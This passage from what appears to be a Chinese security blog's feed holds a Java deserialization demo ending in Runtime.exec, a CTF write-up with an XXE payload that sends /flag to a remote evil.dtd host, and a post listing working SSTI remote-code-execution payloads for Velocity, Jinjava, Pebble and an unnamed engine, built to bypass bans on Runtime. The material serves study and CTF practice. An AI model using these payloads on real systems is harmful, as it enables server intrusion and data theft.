class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 加入执行命令代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略set、get方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"VulnerabilityClass&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", date="</span> + date +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">(String username, String password, Date date, Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 调用序列化方法</span></span><br><span class="line">        Serilizable();</span><br><span class="line">        <span class="comment">// 反序列化方法</span></span><br><span class="line">        UnSerializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serilizable</span><span class="params">()</span></span>&#123;</span><br><span class="line">        VulnerabilityClass clazz = <span class="keyword">new</span> VulnerabilityClass();</span><br><span class="line">        clazz.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">        clazz.setId(<span class="number">1314520</span>);</span><br><span class="line">        clazz.setPassword(<span class="string">"summer6666"</span>);</span><br><span class="line">        clazz.setUsername(<span class="string">"summer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写文件</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">            oos.writeObject(clazz);</span><br><span class="line">            System.out.println(<span class="string">"serilizable: "</span> + clazz);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">UnSerializable</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">            VulnerabilityClass clazz = (VulnerabilityClass) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + clazz);</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> VulnerabilityClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200516145552671.gif" alt="在这里插入图片描述"></p><p><strong>漏洞成因分析</strong></p><p>&emsp;&emsp; 在漏洞源码中的<code>readObject()</code>方法，第一行是默认的反序列化方法<code>defaultReadObject()</code>，但是下面一行是添加了<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，虽然这里简单粗暴的将执行命令的代码写入了方法。实际的情况下，开发人员是不会这么做，笔者这里简单展示一下漏洞原理。实际情况都是攻击者通过各种伪造方法、修改、重定义等方法最后到达执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 加入执行命令代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 反序列化漏洞三要素实现<code>Serializabe</code>接口、<code>readObject()</code>、<code>writeObject()</code>方法，缺一不可。但试想一下，如果用户控制了<code>readObject</code>亦或者是<code>writeObject</code>方法，那么是不是可以造成反序列化漏洞呢？其实也有一个问题控制不了<code>writeObject</code>方法，因为其在服务器内，或者是Java应用内，我们不可能去修改内部代码。所以说只能通过控制<code>readObject</code>方法，这里的控制得打双引号。问题来了，前人大佬们已经研究出来许多控制方法，经典<code>AnnotationInvocationHandler</code>和<code>BadAttributeValueExpException</code>类均满足条件，下篇文章带你分析。<br>&emsp;&emsp; 如果要深入理解反序列化漏洞可以去学习反序列化利用工具<code>ysoserial</code>。网上很多反序列化文章基本上都是研究<code>commons-collection</code>反序列化，但其实<code>commons-colection</code>反序列化链是很复杂，不建议新手小白学习。<code>ysoserial-Gadget-URLDNS</code>这条反序列化链建议新手小白学习，比较简单。推荐文章<a href="https://samny.blog.csdn.net/article/details/105790987" target="_blank" rel="noopener">小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</a>，这篇文章全方位的解释<code>URLDNS</code>这条链的利用、成因，相对其他作者写的文章分析更加全面，基本上你知道或者不知道都在文章里面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Java的反序列化漏洞探索出了Java安全的新纪元。开发人员为什么要反序列化呢？众所周知，用户和服务器进行交互时，
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯---Java文件上传wp</title>
    <link href="https://summersec.github.io/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/"/>
    <id>https://summersec.github.io/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/</id>
    <published>2020-05-14T13:27:45.000Z</published>
    <updated>2020-05-29T06:08:57.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://samny.blog.csdn.net/article/details/104426472" target="_blank" rel="noopener">一篇文章读懂Java代码审计之XXE</a>看过我这篇博客应该不难，没看过建议在看看。</p><hr><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>下载了所有的class发现需要上传xlsx poi<br>开头必须是execl<br><img src="https://img-blog.csdnimg.cn/20200510170315420.png" alt="在这里插入图片描述"></p><ul><li>新建execl</li></ul><p>-1.xlsx文件，修改后缀名execl<br>-1.xlsx.zip解压。<br><img src="https://img-blog.csdnimg.cn/20200510171215395.png" alt="在这里插入图片描述"></p><ul><li><p>修改[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip:8089/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051518123493.png" alt="在这里插入图片描述"></p></li><li><p>重新打包成<code>excel-1.xlsx</code>，文件名一定不能错。</p></li><li><p>在服务器上新建一个<code>evil.etd</code>文件。<br><img src="https://img-blog.csdnimg.cn/20200510170751751.png" alt="在这里插入图片描述"></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY send SYSTEM 'http://ip:8089/%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><hr><ul><li>然后直接上传，查看服务器http记录。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200510170959142.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020051017050929.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://samny.blog.csdn.net/article/details/104426472&quot; target
      
    
    </summary>
    
    
    
      <category term="Java 文件上传" scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--终章</title>
    <link href="https://summersec.github.io/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/</id>
    <published>2020-05-13T02:42:16.000Z</published>
    <updated>2020-05-13T02:30:57.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/309" target="_blank" rel="noopener">https://www.sec-in.com/article/309</a><br>&emsp;&emsp; 通过前两章的了解，大家对Java反射机制有了一定的认知。本章作为反射篇的最终章，如果从反序列化的层面来说Java反射的具体危害，需要一些反序列化的基础知识。故笔者决定从反射机制本身来说，它的一个经常被使用的点—Server-Side Template Injection（简称SSTI），中文名服务器端模板注入。</p><hr><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>&emsp;&emsp; 模板引擎被广泛应用于Web应用程序中，通过网页和电子邮件呈现动态数据。将用户输入内容不安全嵌入到模板中，实现服务器端模板注入。SSTI极其容易被误认为是跨站点脚本（XSS），大多数人经常与之擦肩而过。与XSS不同的是，模板注入可以用于直接攻击Web服务器内部，并经常获得远程代码执行（RCE）。模板注入可以通过开发人员的错误配置，通过故意暴露模板，开发人员试图通过来其提供丰富的功能，就像维基、博客、营销应用和内容管理等系统。<br>&emsp;&emsp;先看通用的Java SSTI的payload，payload中的T通常是需要声明的变量，每一个模板引擎都不同。在这里，我们不能发现已经可以看到反射的<code>“影子”</code>了，下面会从每一个模板来具体分析介绍任何使用反射从<code>SSTI</code>到<code>RCE</code>。</p><ol><li>获取系统环境变量<blockquote><p>${T(java.lang.System).getenv()}</p></blockquote></li><li>读取文件内容<blockquote><ul><li>${T(java.lang.Runtime).getRuntime().exec(‘cat etc/passwd’)}</li><li>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</li></ul></blockquote></li></ol><hr><h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; 这里模板引擎是国内的模板引擎，漏洞还未必收录，故暂不公布，这里只做学习研究。如果你无意中接触过这个模板，如果你认出了这个模板，那么恭喜你获得0day一枚。笔者有一个请求如果你认出了，就不要公布了，0day你自己知道就好了。此款模板引擎禁止使用了<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>类的使用，使用Java的反射机制完美的bypass。</p><h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><ol><li>我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>的形式，然后payload就变成下面这样子了。<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>最终payload就变成了下面这样子。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; Velocity是一个基于Java的模板引擎，是隶属于Apache旗下的一个开源项目。它允许任何人使用简单而强大的模板语言来引用Java代码中定义的对象。<br>&emsp;&emsp; 下面是Velocity的SSTI的payload，此时的你可能会有个疑问。payload语法好像有点奇怪？这个其实是模板语法，每一个模板引擎的语法都不同。笔者觉得大同小异，有过编程的基础童鞋，稍加学习就能明白。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h3 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a>#set语法</h3><p>&emsp;&emsp;  #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($ var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h3 id="foreach语法"><a href="#foreach语法" class="headerlink" title="foreach语法"></a>foreach语法</h3><p>&emsp;&emsp; Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($ child in $person.children) $ person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$ child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$ person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><p>更多语法知识推荐<a href="http://www.yunshouce.com/g62/velocitydoc/11.html" target="_blank" rel="noopener">Velocity中文文档</a>。</p><hr><h2 id="反射Payload"><a href="#反射Payload" class="headerlink" title="反射Payload"></a>反射Payload</h2><p>&emsp;&emsp; 了解语法之后，回头看payload会觉得很简单，其实就是基本的payload的构造。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>把payload转化成伪代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rt = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">chr</span> </span>= java.lang.String</span><br><span class="line">ex = java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line">ex.waitFor()</span><br><span class="line"><span class="comment">// 接着就是循环读取输出</span></span><br></pre></td></tr></table></figure><p><strong>推荐一个经典案例</strong><br><a href="https://samny.blog.csdn.net/article/details/102843715" target="_blank" rel="noopener">Apache Solr 模板注入远程命令执行</a>漏洞详情<br><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">白头搔更短，SSTI惹人心！</a>漏洞分析</p><hr><h1 id="Jinjava"><a href="#Jinjava" class="headerlink" title="Jinjava"></a>Jinjava</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; Jinjava是一款开源的 Java 模板引擎，基于 django 模板语法，适用于渲染 jinja 模板（至少是 HubSpot 内容中使用的 jinja 子集）。目前在生产中用于渲染<code>HubSpot CMS</code>，每月有数以亿计的页面浏览量的网站。<a href="https://github.com/HubSpot/jinjava" target="_blank" rel="noopener">官方GitHub地址</a>。<br>判断Jinjava是否存在SSTI漏洞的payload：</p><ol><li>A 回显大写``A``</li><li> 会返回一个请求对象 例如：``com.[...].context.TemplateContextRequest@23548206``</li></ol><h2 id="反射Payload-1"><a href="#反射Payload-1" class="headerlink" title="反射Payload"></a>反射Payload</h2><p>&emsp;&emsp; 这款模板引擎的payload直接就能看出是用Java的反射机制，都是先获取的<code>javax.script.ScriptEngineManager</code>类对象，然后<code>newInstance()</code>实例化，在之后创建一个<code>JavaScript</code>引擎最后执行命令。<br><img src="https://img-blog.csdnimg.cn/20200430101257182.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"new java.lang.String(<span class="string">'xxx'</span>)\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Pebble"><a href="#Pebble" class="headerlink" title="Pebble"></a>Pebble</h1><p>&emsp;&emsp; Pebble是一个受Twig启发的java模板化引擎。它以其继承功能和易读的语法从人群中脱颖而出。它内置了安全的自动缩放功能，并且包含了对国际化的集成支持。更多内容查看<a href="https://github.com/PebbleTemplates/pebble" target="_blank" rel="noopener">官方GitHub地址</a>，<a href="https://pebbletemplates.io/wiki/guide/basic-usage/" target="_blank" rel="noopener">官方文档</a>。<br>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = <span class="string">'id'</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.Runtime'</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.String'</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 各大模板引擎在设计的时候，都或多或少变相禁止<code>java.lang.Runtime</code>和<code>java.lang.Processbuilder</code>类，因此使用Java的反射机制可以完全的绕过限制。想要深入学习SSTI漏洞的时候，建议看模板引擎官方给出的文档，在结合JDK文档大多数模板引擎是可以bypass的。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">https://samny.blog.csdn.net/article/details/104881477</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/309&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--序章</title>
